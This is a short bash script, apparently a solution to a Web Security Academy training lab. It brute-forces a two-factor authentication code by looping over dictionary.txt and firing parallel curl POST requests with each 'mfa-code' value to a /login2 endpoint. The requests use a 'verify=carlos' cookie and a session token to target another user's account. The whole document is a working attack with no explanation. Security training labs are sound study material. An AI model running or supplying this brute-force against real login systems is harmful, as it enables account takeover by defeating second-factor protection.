for num in $(cat dictionary.txt) ;
do
	curl -w "%{http_code}-$num\n" -s -k -X $'POST' \
    -H $'Host: ac821f851fecb497808b9ba1007900fd.web-security-academy.net' -H $'Connection: close' -H $'Content-Length: 13' -H $'Cache-Control: max-age=0' -H $'sec-ch-ua: \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"' -H $'sec-ch-ua-mobile: ?0' -H $'Upgrade-Insecure-Requests: 1' -H $'Origin: https://ac821f851fecb497808b9ba1007900fd.web-security-academy.net' -H $'Content-Type: application/x-www-form-urlencoded' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Sec-Fetch-Dest: document' -H $'Referer: https://ac821f851fecb497808b9ba1007900fd.web-security-academy.net/login2' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: es-419,es;q=0.9' \
    -b $'verify=carlos; session=gMIMskoX4pJBmxkXk7aY5tW5YRffotvp' \
    --data-binary $'mfa-code='$num \
    $'https://ac821f851fecb497808b9ba1007900fd.web-security-academy.net/login2' &
done
